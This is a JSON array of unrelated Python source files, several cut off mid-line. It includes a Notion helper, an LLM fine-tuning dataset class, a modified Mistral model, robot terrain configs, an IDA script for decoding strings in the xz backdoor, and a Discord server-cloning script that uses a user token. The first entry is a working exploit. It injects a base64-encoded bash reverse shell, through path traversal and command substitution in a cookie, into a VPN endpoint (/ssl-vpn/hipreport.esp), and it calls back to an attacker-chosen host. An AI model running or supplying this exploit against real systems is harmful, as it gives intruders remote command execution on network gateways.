[
    "import subprocess\nimport base64\n\ndef generate_reverse_shell(lhost, lport):\n    reverse_shell_command = f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"\n    encoded_reverse_shell = base64.b64encode(reverse_shell_command.encode()).decode()\n    return encoded_reverse_shell\n\ndef generate_curl_command(IP, encoded_reverse_shell):\n    curl_command = (\n        f\"curl -s -X POST 'https://{IP}/ssl-vpn/hipreport.esp' -k \"\n        f\"-H 'Cookie: SESSID=/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${{IFS}}{encoded_reverse_shell}|base64${{IFS}}-d|bash`'\"\n    )\n\n    return curl_command\n\nIP = input(\"Enter the vulnerable target IP/Host: \")\nlhost = input(\"Enter the IP/Host for reverse shell: \")\nlport = input(\"Enter the port for reverse shell: \")\n\nencoded_reverse_shell = generate_reverse_shell(lhost, lport)\n\ncurl_command = generate_curl_command(IP, encoded_reverse_shell)\n\ntry:\n    subprocess.run(curl_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    print(\"Reverse shell successfully launched. Please wait.\")\nexcept subprocess.CalledProcessError:\n    print(\"Error occurred while launching reverse shell.\")\n",
    "import mmap\nimport multiprocessing\nimport os\n\nCPU_COUNT = os.cpu_count()\nMMAP_PAGE_SIZE = os.sysconf(\"SC_PAGE_SIZE\")\n\n\ndef to_int(x: bytes) -> int:\n    # Parse sign\n    if x[0] == 45:  # ASCII for \"-\"\n        sign = -1\n        idx = 1\n    else:\n        sign = 1\n        idx = 0\n    # Check the position of the decimal point\n    if x[idx + 1] == 46:  # ASCII for \".\"\n        # -#.# or #.#\n        # 528 == ord(\"0\") * 11\n        result = sign * ((x[idx] * 10 + x[idx + 2]) - 528)\n    else:\n        # -##.# or ##.#\n        # 5328 == ord(\"0\") * 111\n        result = sign * ((x[idx] * 100 + x[idx + 1] * 10 + x[idx + 3]) - 5328)\n\n    return result\n\n\ndef process_line(line, result):\n    idx = line.find(b\";\")\n\n    city = line[:idx]\n    temp_float = to_int(line[idx + 1 : -1])\n\n    if city in result:\n        item = result[city]\n        item[0] += 1\n        item[1] += temp_float\n        item[2] = min(item[2], temp_float)\n        item[3] = max(item[3], temp_float)\n    else:\n        result[city] = [1, temp_float, temp_float, temp_float]\n\n\n# Will get OS errors if mmap offset is not aligned to page size\ndef align_offset(offset, page_size):\n    return (offset // page_size) * page_size\n\n\ndef process_chunk(file_path, start_byte, end_byte):\n    offset = align_offset(start_byte, MMAP_PAGE_SIZE)\n    result = {}\n\n    with open(file_path, \"rb\") as file:\n        length = end_byte - offset\n\n        with mmap.mmap(\n            file.fileno(), length, access=mmap.ACCESS_READ, offset=offset\n        ) as mmapped_file:\n            mmapped_file.seek(start_byte - offset)\n            for line in iter(mmapped_file.readline, b\"\"):\n                process_line(line, result)\n    return result\n\n\ndef reduce(results):\n    final = {}\n    for result in results:\n        for city, item in result.items():\n            if city in final:\n                city_result = final[city]\n                city_result[0] += item[0]\n                city_result[1] += item[1]\n                city_result[2] = min(city_result[2], item[2])\n                city_result[3] = max(city_result[3], item[3])\n            else:\n                final[city] = item\n    return final\n\n\ndef read_file_in_chunks(file_path):\n    file_size_bytes = os.path.getsize(file_path)\n    base_chunk_size = file_size_bytes // CPU_COUNT\n    chunks = []\n\n    with open(file_path, \"r+b\") as file:\n        with mmap.mmap(\n            file.fileno(), length=0, access=mmap.ACCESS_READ\n        ) as mmapped_file:\n            start_byte = 0\n            for _ in range(CPU_COUNT):\n                end_byte = min(start_byte + base_chunk_size, file_size_bytes)\n                end_byte = mmapped_file.find(b\"\\n\", end_byte)\n                end_byte = end_byte + 1 if end_byte != -1 else file_size_bytes\n                chunks.append((file_path, start_byte, end_byte))\n                start_byte = end_byte\n\n    with multiprocessing.Pool(processes=CPU_COUNT) as p:\n        results = p.starmap(process_chunk, chunks)\n\n    final = reduce(results)\n\n    print(\n        \"{\",\n        \", \".join(\n            f\"{loc.decode()}={0.1*val[2]:.1f}/{(0.1*val[1] / val[0]):.1f}/{0.1*val[3]:.1f}\"\n            for loc, val in sorted(final.items())\n        ),\n        \"}\",\n        sep=\"\",\n    )\n\n\nif __name__ == \"__main__\":\n    read_file_in_chunks(\"data/measurements.txt\")\n",
    "from google.cloud import texttospeech\nimport os\nimport pygame\nfrom time import sleep\nimport tempfile\n\n\ndef speak(text: str):\n    client = texttospeech.TextToSpeechClient()\n    synthesis_input = texttospeech.SynthesisInput(text=text)\n    voice = texttospeech.VoiceSelectionParams(\n        language_code=\"en-US\",\n        ssml_gender=texttospeech.SsmlVoiceGender.MALE\n    )\n    audio_config = texttospeech.AudioConfig(\n        audio_encoding=texttospeech.AudioEncoding.MP3\n    )\n    response = client.synthesize_speech(\n        input=synthesis_input,\n        voice=voice,\n        audio_config=audio_config\n    )\n\n    # Create a temporary file\n    with tempfile.NamedTemporaryFile(delete=False, suffix=\".mp3\") as temp_file:\n        temp_file.write(response.audio_content)\n        temp_file_path = temp_file.name\n\n    print(f'Audio content written to temporary file: {temp_file_path}')\n\n    # Initialize pygame mixer\n    pygame.mixer.init()\n\n    # Load the temporary audio file\n    pygame.mixer.music.load(temp_file_path)\n\n    # Play the audio file\n    pygame.mixer.music.play()\n\n    # Wait for the music to play completely\n    while pygame.mixer.music.get_busy():\n        sleep(0.5)\n\n    # Remove the temporary file\n    os.remove(temp_file_path)\n\n\nif __name__ == \"__main__\":\n    speak(\"Hello, how are you?\")\n",
    "import logging\nimport os\nimport re\nimport time\n\nfrom notion_client import Client\nfrom retrying import retry\nfrom datetime import timedelta\nfrom dotenv import load_dotenv\nload_dotenv()\nfrom utils import (\n    format_date,\n    get_date,\n    get_first_and_last_day_of_month,\n    get_first_and_last_day_of_week,\n    get_first_and_last_day_of_year,\n    get_icon,\n    get_relation,\n    get_title,\n)\n\nTAG_ICON_URL = \"https://www.notion.so/icons/tag_gray.svg\"\nUSER_ICON_URL = \"https://www.notion.so/icons/user-circle-filled_gray.svg\"\nTARGET_ICON_URL = \"https://www.notion.so/icons/target_red.svg\"\nBOOKMARK_ICON_URL = \"https://www.notion.so/icons/bookmark_gray.svg\"\n\n\nclass NotionHelper:\n    database_name_dict = {\n        \"PODCAST_DATABASE_NAME\": \"Podcast\",\n        \"EPISODE_DATABASE_NAME\": \"Episode\",\n        \"ALL_DATABASE_NAME\": \"\u5168\u90e8\",\n        \"AUTHOR_DATABASE_NAME\": \"Author\",\n    }\n    database_id_dict = {}\n    image_dict = {}\n    def __init__(self):\n        self.client = Client(auth=os.getenv(\"NOTION_TOKEN\"), log_level=logging.ERROR)\n        self.__cache = {}\n        self.page_id = self.extract_page_id(os.getenv(\"NOTION_PAGE\"))\n        self.search_database(self.page_id)\n        for key in self.database_name_dict.keys():\n            if os.getenv(key) != None and os.getenv(key) != \"\":\n                self.database_name_dict[key] = os.getenv(key)\n        self.episode_database_id = self.database_id_dict.get(\n            self.database_name_dict.get(\"EPISODE_DATABASE_NAME\")\n        )\n        self.podcast_database_id = self.database_id_dict.get(\n            self.database_name_dict.get(\"PODCAST_DATABASE_NAME\")\n        )\n        self.author_database_id = self.database_id_dict.get(\n            self.database_name_dict.get(\"AUTHOR_DATABASE_NAME\")\n        )      \n        self.all_database_id = self.database_id_dict.get(\n            self.database_name_dict.get(\"ALL_DATABASE_NAME\")\n        )\n\n    def extract_page_id(self, notion_url):\n        # \u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d 32 \u4e2a\u5b57\u7b26\u7684 Notion page_id\n        match = re.search(\n            r\"([a-f0-9]{32}|[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})\",\n            notion_url,\n        )\n        if match:\n            return match.group(0)\n        else:\n            raise Exception(f\"\u83b7\u53d6NotionID\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u8f93\u5165\u7684Url\u662f\u5426\u6b63\u786e\")\n\n\n    def search_database(self, block_id):\n        children = self.client.blocks.children.list(block_id=block_id)[\"results\"]\n        # \u904d\u5386\u5b50\u5757\n        for child in children:\n            # \u68c0\u67e5\u5b50\u5757\u7684\u7c7b\u578b\n\n            if child[\"type\"] == \"child_database\":\n                self.database_id_dict[\n                    child.get(\"child_database\").get(\"title\")\n                ] = child.get(\"id\")\n            # \u5982\u679c\u5b50\u5757\u6709\u5b50\u5757\uff0c\u9012\u5f52\u8c03\u7528\u51fd\u6570\n            if \"has_children\" in child and child[\"has_children\"]:\n                self.search_database(child[\"id\"])\n    @retry(stop_max_attempt_number=3, wait_fixed=5000)\n    def update_image_block_link(self, block_id, new_image_url):\n        # \u66f4\u65b0 image block \u7684\u94fe\u63a5\n        self.client.blocks.update(\n            block_id=block_id, image={\"external\": {\"url\": new_image_url}}\n        )\n\n    def get_week_relation_id(self, date):\n        year = date.isocalendar().year\n        week = date.isocalendar().week\n        week = f\"{year}\u5e74\u7b2c{week}\u5468\"\n        start, end = get_first_and_last_day_of_week(date)\n        properties = {\"\u65e5\u671f\": get_date(format_date(start), format_date(end))}\n        return self.get_relation_id(\n            week, self.week_database_id, TARGET_ICON_URL, properties\n        )\n\n    def get_month_relation_id(self, date):\n        month = date.strftime(\"%Y\u5e74%-m\u6708\")\n        start, end = get_first_and_last_day_of_month(date)\n        properties = {\"\u65e5\u671f\": get_date(format_date(start), format_date(end))}\n        return self.get_relation_id(\n            month, self.month_database_id, TARGET_ICON_URL, properties\n        )\n\n    def get_year_relation_id(self, date):\n        year = date.strftime(\"%Y\")\n        start, end = get_first_and_last_day_of_year(date)\n        properties = {\"\u65e5\u671f\": get_date(format_date(start), format_date(end))}\n        return self.get_relation_id(\n            year, self.year_database_id, TARGET_ICON_URL, properties\n        )\n\n    def get_day_relation_id(self, date):\n        new_date = date.replace(hour=0, minute=0, second=0, microsecond=0)\n        day = new_date.strftime(\"%Y\u5e74%m\u6708%d\u65e5\")\n        properties = {\n            \"\u65e5\u671f\": get_date(format_date(date)),\n        }\n        properties[\"\u5e74\"] = get_relation(\n            [\n                self.get_year_relation_id(new_date),\n            ]\n        )\n        properties[\"\u6708\"] = get_relation(\n            [\n                self.get_month_relation_id(new_date),\n            ]\n        )\n        properties[\"\u5468\"] = get_relation(\n            [\n                self.get_week_relation_id(new_date),\n            ]\n        )\n        return self.get_relation_id(\n            day, self.day_database_id, TARGET_ICON_URL, properties\n        )\n    \n    @retry(stop_max_attempt_number=3, wait_fixed=5000)\n    def get_relation_id(self, name, id, icon, properties={}):\n        k",
    "import copy\nimport os\nfrom typing import Dict, Optional\n\nimport torch\nimport transformers\nfrom data import make_lloco_data_module\nfrom datasets import load_dataset\nfrom model import DataArguments, ModelArguments, TrainingArguments, init_model\nfrom torch.utils.data import Dataset\nfrom tqdm import tqdm\nfrom transformers import Trainer\n\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\nIGNORE_INDEX = -100\ntruncation_seperator = \"... [The rest of the story is omitted]\\n\\n\"\nlocal_rank = None\n\n\nhqa_prompt = \"Answer the question based on the given passages. Only give me the answer and do not output any other words.\\n\\nThe following are given passages.\\n{context}\\n\\nAnswer the question based on the given passages. Only give me the answer and do not output any other words.\\n\\nQuestion: {input}\\nAnswer:\"\n\n\ndef rank0_print(*args):\n    if local_rank == 0:\n        print(*args)\n\n\nclass LazyHotpotSFTDataset(Dataset):\n    \"\"\"Dataset for supervised fine-tuning.\"\"\"\n\n    def __init__(\n        self,\n        tokenizer: transformers.PreTrainedTokenizer,\n        embedding_path: Optional[str] = None,\n        inference_mode: bool = False,\n        split: str = \"train\",\n        mode: str = \"baseline\",\n        n_sample: int = 10000,\n    ):\n        super(LazyHotpotSFTDataset, self).__init__()\n        rank0_print(\"Loading data...\")\n        if split == \"validation\":\n            self.dataset = load_dataset(\"hotpot_qa\", \"fullwiki\", split=\"validation\")\n            self.dataset = self.__preproc_dataset(self.dataset)\n            print(\"dataset size:\", len(self.dataset))\n        else:\n            self.dataset = load_dataset(\"hotpot_qa\", \"fullwiki\", split=\"train\")\n            rank0_print(f\"Shuffling and selecting {n_sample} examples from the training set...\")\n            self.dataset = self.dataset.shuffle(seed=42).select(range(n_sample))\n\n        if embedding_path is not None:\n            rank0_print(\"Loading context embeddings...\")\n            self.context_embeddings_map = torch.load(embedding_path)\n            self.is_preprocessed = True\n        else:\n            rank0_print(\n                \"No context embeddings provided, will use context data instead.\"\n            )\n            self.context_embeddings_map = None\n            self.is_preprocessed = False\n\n        self.tokenizer = tokenizer\n        self.cached_data_dict = {}\n        self.inference_mode = inference_mode\n        self.mode = mode\n\n        print(\"Current mode:\", self.mode)\n\n    def __preproc_dataset(self, dataset):\n        ret = []\n        visited = set()\n        for data in tqdm(dataset):\n            example_id = data[\"id\"]\n            if example_id not in visited:\n                visited.add(example_id)\n                ret.append(data)\n        return ret\n\n    def __len__(self):\n        return len(self.dataset)\n\n    def __getitem__(self, i) -> Dict[str, torch.Tensor]:\n        entry = self.dataset[i]\n        article_id = entry[\"id\"]\n\n        question = entry[\"question\"]\n        answer = entry[\"answer\"]\n\n        icl_prompt = \"You were just given an article from above. I will now give you a question. Answer the question as concisely as you can, using a single phrase or sentence if possible.\\nQuestion: \"\n\n        question = icl_prompt + question + \"\\nAnswer:\"\n\n        q_input_ids = self.tokenizer(\n            question, truncation=True, add_special_tokens=False\n        ).input_ids\n        a_input_ids = self.tokenizer(\n            answer, truncation=True, add_special_tokens=False\n        ).input_ids\n        a_input_ids += [self.tokenizer.eos_token_id]\n\n        if \"baseline\" in self.mode:\n            if self.mode == \"baseline_nocontext\":\n                start_index = hqa_prompt.find(\"{context}\\n\\n\") + len(\"{context}\\n\\n\")\n                prompt = hqa_prompt[start_index:].format(\n                    input=entry[\"question\"],\n                )\n            elif self.mode == \"baseline\":\n                context = \"\"\n                for i, (title, sentences) in enumerate(\n                    zip(entry[\"context\"][\"title\"], entry[\"context\"][\"sentences\"])\n                ):\n                    if i > 0:\n                        context += \"\\n\\n\"\n                    context += title + \"\\n\"\n                    for sent in sentences:\n                        context += sent\n\n                prompt = hqa_prompt.format(\n                    input=question,\n                    context=context,\n                )\n            prompt = f\"[INST]{prompt}[/INST]\"\n            decoder_input_ids = self.tokenizer(\n                prompt,\n                padding=\"longest\",\n                truncation=True,\n                add_special_tokens=False,\n                max_length=4000,\n            ).input_ids\n        else:\n            decoder_input_ids = copy.deepcopy(q_input_ids)\n\n        if not self.inference_mode:\n            decoder_input_ids += a_input_ids\n\n        decoder_input_ids = torch.as_tensor(decoder_input_ids)\n        labels = copy.deepcopy(decoder_input_ids)\n        labels[: len(q_input_",
    "# Created by @q3k:\n# https://gist.github.com/q3k/3fadc5ce7b8001d550cf553cfdc09752\n\n# Used as part of xzbd_chooser.py\n\nimport struct\n\nimport ida_bytes\n\ntbl_1_mem = ida_bytes.get_bytes(0xAEE0, 0xC340 - 0xAEE0)\ntbl_2_mem = ida_bytes.get_bytes(0xC340, 0xCAB0 - 0xC340)\n\n\ndef popcount(v):\n    return bin(v).count(\"1\")\n\n\ndef tbl_1_entry(offs):\n    tbl_1_entry = tbl_1_mem[offs : offs + 4]\n    a, b = struct.unpack(\"<HH\", tbl_1_entry)\n    return a, b\n\n\ndef tbl_2_entry(offs):\n    tbl_2 = struct.unpack(\"<QQ\", tbl_2_mem[offs : offs + 16])\n    return tbl_2\n\n\ndef tbl_2_lookup(tbl_2, c):\n    if c > 127:\n        return None\n\n    ix = 0\n    lookup = tbl_2[0]\n    if c < 0x40:\n        if (lookup >> (c & 0x3F)) & 1 == 0:\n            return None\n    else:\n        lookup = tbl_2[1]\n        c -= 0x40\n        if (lookup >> (c & 0x3F)) & 1 == 0:\n            return None\n        ix = popcount(tbl_2[0])\n\n    # find the actually responsible bit\n    while True:\n        zeroes = 0\n        if lookup != 0:\n            while ((lookup >> zeroes) & 1) == 0:\n                zeroes += 1\n        if zeroes == c:\n            break\n        ix += 1\n        lookup = lookup & (lookup - 1)\n    return ix\n\n\ndef h(data):\n    tbl_1_offs = 0x13E8\n    tbl_2_offs = 0x760\n\n    for c in data:\n        # print(tbl_1_offs, tbl_2_offs)\n        tbl_2 = tbl_2_entry(tbl_2_offs)\n\n        # c = ord(c)\n        ix = tbl_2_lookup(tbl_2, c)\n        if ix is None:\n            return 0\n\n        _tbl_1_ix = tbl_1_offs + ix * 4\n        a, b = tbl_1_entry(tbl_1_offs + ix * 4)\n\n        if (a & 4) != 0:\n            return b\n        elif (a & 2) == 0:\n            b = -b\n        else:\n            a &= 0xFFFD\n\n        add_tbl2 = a & 0xFFFE\n        if (a & 1) == 0:\n            add_tbl2 = -a\n\n        add_tbl1 = b - 4\n        add_tbl2 = add_tbl2 - 0x10\n        tbl_1_offs += add_tbl1\n        tbl_2_offs += add_tbl2\n    return 0\n\n\ndef invert(tbl_1_offs=0x13E8, tbl_2_offs=0x760):\n    tbl_2 = tbl_2_entry(tbl_2_offs)\n\n    res = []\n    for i in range(128):\n        ix = tbl_2_lookup(tbl_2, i)\n        # invalid\n        if ix is None:\n            continue\n        _tbl_1_ix = tbl_1_offs + ix * 4\n        a, b = tbl_1_entry(tbl_1_offs + ix * 4)\n\n        if (a & 4) != 0:\n            # end of string\n            res.append([i])\n            continue\n\n        # string continues\n        if (a & 2) == 0:\n            b = -b\n        else:\n            a &= 0xFFFD\n\n        add_tbl2 = a & 0xFFFE\n        if (a & 1) == 0:\n            add_tbl2 = -a\n\n        add_tbl1 = b - 4\n        add_tbl2 = add_tbl2 - 0x10\n\n        _followup = [i]\n        for extra in invert(tbl_1_offs + add_tbl1, tbl_2_offs + add_tbl2):\n            res.append([i] + extra)\n\n    return res\n\n\nif __name__ == \"__main__\":\n    res = invert()\n    for r in res:\n        print(\"{:#04x}\".format(h(bytes(r))), bytes(r))\n",
    "from httpx import Client\nfrom base64 import b64encode\nfrom time import sleep\nfrom colorama import Fore, Back, Style, init\nfrom time import strftime\nfrom json import loads, JSONDecodeError\nimport time\nimport os\n\n\n\n\ninit(autoreset=True)\n\ndef p(text: str) -> None:\n    print(\n        f\"{Fore.LIGHTWHITE_EX}[{Fore.CYAN}{strftime('%H:%M:%S')}{Fore.LIGHTWHITE_EX}] {text}\"\n        .replace('[+]', f'[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTWHITE_EX}]')\n        .replace('[*]', f'[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}]')\n        .replace('[>]', f'[{Fore.CYAN}>{Fore.LIGHTWHITE_EX}]')\n        .replace('[-]', f'[{Fore.RED}-{Fore.LIGHTWHITE_EX}]')\n    )\n\nclass Scrape:\n    def __init__(self, token: str, id: str) -> None:\n        self.token      = token\n        self.id         = id\n        self.baseurl    = f\"https://discord.com/api/v9/guilds/{self.id}\"\n        self.session    = Client()\n        self.headers    = {\"Authorization\": self.token}\n\n    def do_request(self, url) -> dict:\n        return self.session.get(\n            url = url,\n            headers = self.headers,\n        ).json()\n\n    def get_channels(self) -> dict:\n        return self.do_request(f\"{self.baseurl}/channels\")\n\n    def get_info(self) -> dict:\n        return self.do_request(self.baseurl)\n\n    def get_data(self) -> dict:\n        info = self.get_info()\n        channels = self.get_channels()\n\n        return {\n            \"info\"      : info,\n            \"channels\"  : channels,\n            \"roles\"     : info.get(\"roles\", []),\n            \"emojis\"    : info.get(\"emojis\", []),\n        }\n\nclass Create:\n    def __init__(self, token: str, data: dict) -> None:\n        self.token      = token\n        self.baseurl    = \"https://discord.com/api/v9\"\n        self.session    = Client()\n        self.data       = data\n        self.headers    = {\"Authorization\": self.token}\n        self.delay      = 0.5  # I wouldn't change this \n\n    def create_server(self):\n        p(\"[>] Creating server\")\n        img = f\"https://cdn.discordapp.com/icons/{self.data['info']['id']}/{self.data['info']['icon']}.webp?size=96\"\n        img = f\"data:image/png;base64,{b64encode(self.session.get(img).content).decode('utf-8')}\"\n        data = {\n            \"name\"                  : self.data[\"info\"][\"name\"],\n            \"icon\"                  : img,\n            \"channels\"              : [],\n            \"system_channel_id\"     : None,\n            \"guild_template_code\"   : \"8ewECn5UKpDY\",\n        }\n\n        res = self.session.post(\n            url     = f\"{self.baseurl}/guilds\",\n            headers = self.headers,\n            json    = data,\n        ).json()\n\n        print(res)  # Added row\n\n        self.id         = res[\"id\"]\n        self.everyone   = res[\"roles\"][0][\"id\"]\n        url             = f\"{self.baseurl}/guilds/{self.id}/roles/{self.everyone}\"\n        data            = {\n            \"name\"          : \"@everyone\",\n            \"permissions\"   : \"1071698529857\",\n            \"color\"         : 0,\n            \"hoist\"         : False,\n            \"mentionable\"   : False,\n            \"icon\"          : None,\n            \"unicode_emoji\" : None,\n        }\n        self.session.patch(\n            url     = url,\n            headers = self.headers,\n            json    = data,\n        )\n\n        url     = f\"{self.baseurl}/guilds/{self.id}\"\n        data    = {\n            \"features\"                      : [\"APPLICATION_COMMAND_PERMISSIONS_V2\", \"COMMUNITY\"],\n            \"verification_level\"            : 1,\n            \"default_message_notifications\" : 1,\n            \"explicit_content_filter\"       : 2,\n            \"rules_channel_id\"              : \"1\",\n            \"public_updates_channel_id\"     : \"1\",\n        }\n        self.session.patch(\n            url     = url,\n            headers = self.headers,\n            json    = data,\n        )\n\n        p(f\"[+] Created server {self.data['info']['name']} -> {res['id']}\")\n\n    def delete_channels(self):\n        channels = self.session.get(\n            url=f\"{self.baseurl}/guilds/{self.id}/channels\",\n            headers=self.headers,\n        ).json()\n\n        for channel in channels:\n            s = self.session.delete(\n                url=f\"{self.baseurl}/channels/{channel['id']}\",\n                headers=self.headers,\n            ).status_code\n\n            p(f\"[+] Deleted channel {channel['name']} -> {s}\" if s == 200 else f\"[-] Failed to delete channel {channel['name']} -> {s}\")\n\n    def create_channels(self):\n        parentchannels = sorted([channel for channel in self.data[\"channels\"] if channel[\"type\"] == 4] , key=lambda x: x[\"position\"])\n        prnt = {}\n\n        p(f\"[>] Creating {len(parentchannels)} parent channels\")\n\n        for channel in parentchannels:\n            data = {\n                \"name\"                  : channel[\"name\"],\n                \"type\"                  : channel[\"type\"],\n                \"permission_overwrites\" : channel[\"permission_overwrites\"],\n            }\n\n            res = self.session.post(\n                url     = f\"{self.baseur",
    "# coding=utf-8\n# Copyright 2023 Mistral AI and the HuggingFace Inc. team. All rights reserved.\n#\n# This code is based on EleutherAI's GPT-NeoX library and the GPT-NeoX\n# and OPT implementations in this library. It has been modified from its\n# original forms to accommodate minor architectural differences compared\n# to GPT-NeoX and OPT used by the Meta AI team that trained the model.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" PyTorch Mistral model.\"\"\"\nimport inspect\nimport math\nimport warnings\nfrom typing import List, Optional, Tuple, Union, Any\n\nimport torch\nimport torch.nn.functional as F\nimport torch.utils.checkpoint\nfrom torch import nn\nfrom torch.nn import BCEWithLogitsLoss, CrossEntropyLoss, MSELoss\n\nfrom transformers.activations import ACT2FN\nfrom transformers.cache_utils import Cache, DynamicCache\nfrom transformers.modeling_attn_mask_utils import _prepare_4d_causal_attention_mask, _prepare_4d_causal_attention_mask_for_sdpa\nfrom transformers.modeling_outputs import BaseModelOutputWithPast, CausalLMOutputWithPast, SequenceClassifierOutputWithPast\nfrom transformers.modeling_utils import PreTrainedModel\nfrom transformers.utils import (\n    add_start_docstrings,\n    add_start_docstrings_to_model_forward,\n    is_flash_attn_2_available,\n    is_flash_attn_greater_or_equal_2_10,\n    logging,\n    replace_return_docstrings,\n)\nfrom transformers.models.mistral.configuration_mistral import MistralConfig\n\nfrom MoD import MoD\n\nif is_flash_attn_2_available():\n    from flash_attn import flash_attn_func, flash_attn_varlen_func\n    from flash_attn.bert_padding import index_first_axis, pad_input, unpad_input  # noqa\n\n    _flash_supports_window_size = \"window_size\" in list(inspect.signature(flash_attn_func).parameters)\n\n\nlogger = logging.get_logger(__name__)\n\n_CONFIG_FOR_DOC = \"MistralConfig\"\n\n\n# Copied from transformers.models.llama.modeling_llama._get_unpad_data\ndef _get_unpad_data(attention_mask):\n    seqlens_in_batch = attention_mask.sum(dim=-1, dtype=torch.int32)\n    indices = torch.nonzero(attention_mask.flatten(), as_tuple=False).flatten()\n    max_seqlen_in_batch = seqlens_in_batch.max().item()\n    cu_seqlens = F.pad(torch.cumsum(seqlens_in_batch, dim=0, dtype=torch.int32), (1, 0))\n    return (\n        indices,\n        cu_seqlens,\n        max_seqlen_in_batch,\n    )\n\n\n# Copied from transformers.models.llama.modeling_llama.LlamaRMSNorm with Llama->Mistral\nclass MistralRMSNorm(nn.Module):\n    def __init__(self, hidden_size, eps=1e-6):\n        \"\"\"\n        MistralRMSNorm is equivalent to T5LayerNorm\n        \"\"\"\n        super().__init__()\n        self.weight = nn.Parameter(torch.ones(hidden_size))\n        self.variance_epsilon = eps\n\n    def forward(self, hidden_states):\n        input_dtype = hidden_states.dtype\n        hidden_states = hidden_states.to(torch.float32)\n        variance = hidden_states.pow(2).mean(-1, keepdim=True)\n        hidden_states = hidden_states * torch.rsqrt(variance + self.variance_epsilon)\n        return self.weight * hidden_states.to(input_dtype)\n\n\n# copied from transformers.models.llama.modeling_llama.LlamaRotaryEmbedding with Llama->Mistral\n# TODO @Arthur no longer copied from LLama after static cache\nclass MistralRotaryEmbedding(nn.Module):\n    def __init__(self, dim, max_position_embeddings=2048, base=10000, device=None):\n        super().__init__()\n\n        self.dim = dim\n        self.max_position_embeddings = max_position_embeddings\n        self.base = base\n        inv_freq = 1.0 / (self.base ** (torch.arange(0, self.dim, 2, dtype=torch.int64).float().to(device) / self.dim))\n        self.register_buffer(\"inv_freq\", inv_freq, persistent=False)\n\n        # Build here to make `torch.jit.trace` work.\n        self._set_cos_sin_cache(\n            seq_len=max_position_embeddings, device=self.inv_freq.device, dtype=torch.get_default_dtype()\n        )\n\n    def _set_cos_sin_cache(self, seq_len, device, dtype):\n        self.max_seq_len_cached = seq_len\n        t = torch.arange(self.max_seq_len_cached, device=device, dtype=torch.int64).type_as(self.inv_freq)\n\n        freqs = torch.outer(t, self.inv_freq)\n        # Different from paper, but it uses a different permutation in order to obtain the same calculation\n        emb = torch.cat((freqs, freqs), dim=-1)\n        self.register_buffer(\"cos_cached\", emb.cos().to(dtype), persistent=False)\n        self.register_buffer(\"sin_cached\", emb.sin().to(dtype), persistent=False)\n\n    def forward(self, x, seq_len=None):\n        # x: [bs, num_attention_heads, seq_len, he",
    "# Copyright (c) 2022-2024, The ORBIT Project Developers.\n# All rights reserved.\n#\n# SPDX-License-Identifier: BSD-3-Clause\n\n\"\"\"\nConfiguration classes defining the different terrains available. Each configuration class must\ninherit from ``omni.isaac.orbit.terrains.terrains_cfg.TerrainConfig`` and define the following attributes:\n\n- ``name``: Name of the terrain. This is used for the prim name in the USD stage.\n- ``function``: Function to generate the terrain. This function must take as input the terrain difficulty\n  and the configuration parameters and return a `tuple with the `trimesh`` mesh object and terrain origin.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport numpy as np\nimport trimesh\nfrom collections.abc import Callable\nfrom dataclasses import MISSING\nfrom typing import Literal\n\nfrom omni.isaac.orbit.utils import configclass\n\n\n@configclass\nclass FlatPatchSamplingCfg:\n    \"\"\"Configuration for sampling flat patches on the sub-terrain.\n\n    For a given sub-terrain, this configuration specifies how to sample flat patches on the terrain.\n    The sampled flat patches can be used for spawning robots, targets, etc.\n\n    Please check the function :meth:`~omni.isaac.orbit.terrains.utils.find_flat_patches` for more details.\n    \"\"\"\n\n    num_patches: int = MISSING\n    \"\"\"Number of patches to sample.\"\"\"\n\n    patch_radius: float | list[float] = MISSING\n    \"\"\"Radius of the patches.\n\n    A list of radii can be provided to check for patches of different sizes. This is useful to deal with\n    cases where the terrain may have holes or obstacles in some areas.\n    \"\"\"\n\n    x_range: tuple[float, float] = (-1e6, 1e6)\n    \"\"\"The range of x-coordinates to sample from. Defaults to (-1e6, 1e6).\n\n    This range is internally clamped to the size of the terrain mesh.\n    \"\"\"\n\n    y_range: tuple[float, float] = (-1e6, 1e6)\n    \"\"\"The range of y-coordinates to sample from. Defaults to (-1e6, 1e6).\n\n    This range is internally clamped to the size of the terrain mesh.\n    \"\"\"\n\n    z_range: tuple[float, float] = (-1e6, 1e6)\n    \"\"\"Allowed range of z-coordinates for the sampled patch. Defaults to (-1e6, 1e6).\"\"\"\n\n    max_height_diff: float = MISSING\n    \"\"\"Maximum allowed height difference between the highest and lowest points on the patch.\"\"\"\n\n\n@configclass\nclass SubTerrainBaseCfg:\n    \"\"\"Base class for terrain configurations.\n\n    All the sub-terrain configurations must inherit from this class.\n\n    The :attr:`size` attribute is the size of the generated sub-terrain. Based on this, the terrain must\n    extend from :math:`(0, 0)` to :math:`(size[0], size[1])`.\n    \"\"\"\n\n    function: Callable[[float, SubTerrainBaseCfg], tuple[list[trimesh.Trimesh], np.ndarray]] = MISSING\n    \"\"\"Function to generate the terrain.\n\n    This function must take as input the terrain difficulty and the configuration parameters and\n    return a tuple with a list of ``trimesh`` mesh objects and the terrain origin.\n    \"\"\"\n\n    proportion: float = 1.0\n    \"\"\"Proportion of the terrain to generate. Defaults to 1.0.\n\n    This is used to generate a mix of terrains. The proportion corresponds to the probability of sampling\n    the particular terrain. For example, if there are two terrains, A and B, with proportions 0.3 and 0.7,\n    respectively, then the probability of sampling terrain A is 0.3 and the probability of sampling terrain B\n    is 0.7.\n    \"\"\"\n\n    size: tuple[float, float] = MISSING\n    \"\"\"The width (along x) and length (along y) of the terrain (in 